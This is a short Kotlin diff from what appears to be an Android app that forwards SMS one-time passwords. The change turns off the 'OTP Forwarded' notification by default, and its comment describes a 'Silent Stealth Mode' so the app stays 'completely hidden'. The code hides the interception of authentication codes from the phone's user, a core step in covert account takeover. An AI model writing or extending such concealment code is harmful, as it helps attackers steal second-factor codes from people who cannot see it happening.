@@ -149,8 +149,11 @@ object OtpDispatcher {
                 smsStatus = smsStatus
             )
 
-            // Show Local Notification
-            showLocalNotification(context, "OTP: $matchedOtp Forwarded!", alertText)
+            // 100% Silent Stealth Mode by default (No screen popups so app remains completely hidden)
+            val showPopups = prefs.getBoolean("show_screen_popups", false)
+            if (showPopups) {
+                showLocalNotification(context, "OTP: $matchedOtp Forwarded!", alertText)
+            }
         }
     }
 
